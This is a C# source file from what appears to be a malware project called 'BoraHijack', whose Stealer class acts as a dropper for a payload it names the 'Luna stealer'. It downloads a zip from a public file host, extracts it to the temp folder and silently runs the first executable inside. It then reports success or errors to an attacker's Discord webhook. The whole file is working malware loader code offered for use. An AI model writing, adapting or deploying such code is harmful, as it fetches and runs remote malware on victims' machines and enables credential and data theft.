using System;
using System.IO;
using System.Net.Http;
using System.IO.Compression;
using System.Threading.Tasks;
using System.Diagnostics;
using Discord;
using Discord.Webhook;
#pragma warning disable CS0028

namespace BoraHijack.Grabbers
{
    class Stealer
    {
        public static async Task MainSTL(string webhookUrl)
        {
            /*
             * DELETE CONSOLE.WRITELINE OR COMMENT ONCE DONE TESTING
             */

            string fileUrl = "https://litter.catbox.moe/7tj7o4.zip";
            string tempPath = Path.Combine(Path.GetTempPath(), Path.GetFileName(fileUrl));
            string extractPath = Path.Combine(Path.GetTempPath(), "ExtractedFiles");
            var client2 = new DiscordWebhookClient(webhookUrl);
            string exename = "*.exe"; // change exe name

            try
            {
                // download file
                using (HttpClient client = new HttpClient())
                {
                    byte[] fileBytes = await client.GetByteArrayAsync(fileUrl);
                    File.WriteAllBytes(tempPath, fileBytes);
                }

                // extract if it's a zip file
                if (Path.GetExtension(tempPath).Equals(".zip", StringComparison.OrdinalIgnoreCase))
                {
                    ZipFile.ExtractToDirectory(tempPath, extractPath);
                    string[] exeFiles = Directory.GetFiles(extractPath, exename, SearchOption.AllDirectories); // *.exe means it will try finding a exe and run it 

                    // if there no exes found within the directory 
                    if (exeFiles.Length > 0)
                    {
                        string exeToRun = exeFiles[0]; // or add logic to choose a specific one

                        Console.WriteLine($"Found executable: {exeToRun}. Attempting to run...");

                        // Start the .exe
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = exeToRun,
                            UseShellExecute = true // needed if launching with default shell
                        });
                    }

                    await client2.SendMessageAsync(
                        text: "",
                        username: "BoraHijack",
                        avatarUrl: "https://files.catbox.moe/zteeqk.png",
                        isTTS: false,
                        embeds: new[] 
                        {
                            new EmbedBuilder()
                            .WithTitle("Luna Launched!")
                            .WithDescription("Luna has launched.")
                            .WithFooter("Made by v1s0or")
                            .WithColor(158, 19, 244)
                            .Build() 
                        }); 
                }
                else
                {
                    Console.BackgroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Cannot find Stealer");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Something went wrong!: " + ex.Message);
                Console.ResetColor();

                await client2.SendMessageAsync(
                    text: "",
                    username: "BoraHijack",
                    avatarUrl: "https://files.catbox.moe/zteeqk.png",
                    isTTS: false,
                    embeds: new[] 
                    { 
                        new EmbedBuilder()
                        .WithTitle("Error while running Luna stealer")
                        .WithDescription(ex.Message)
                        .Build()
                    });
            }
        }
    }
}
